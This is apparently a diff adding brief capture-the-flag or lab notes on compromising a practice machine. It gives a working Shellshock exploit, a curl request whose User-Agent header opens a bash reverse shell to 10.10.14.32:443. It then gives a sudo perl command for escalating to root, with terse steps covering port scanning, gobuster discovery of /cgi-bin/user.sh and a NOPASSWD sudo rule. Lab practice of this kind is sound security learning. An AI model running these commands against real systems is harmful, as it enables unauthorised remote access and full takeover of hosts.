@@ -1,0 +1,11 @@
+curl -H "User-Agent: () { :; };/bin/bash -i >&/dev/tcp/10.10.14.32/443 0>&1" http://10.10.10.56:80/cgi-bin/user.sh
+sudo perl -e 'exec "/bin/bash"'
+
+scan host, ports 80,2222
+gobuster
+
+found /cgi-bin/user.sh
+
+shell shock to get first shell
+sudo -l reveals perl is running as root (can execute command as root)
+(root) NOPASSWD: /usr/bin/perl
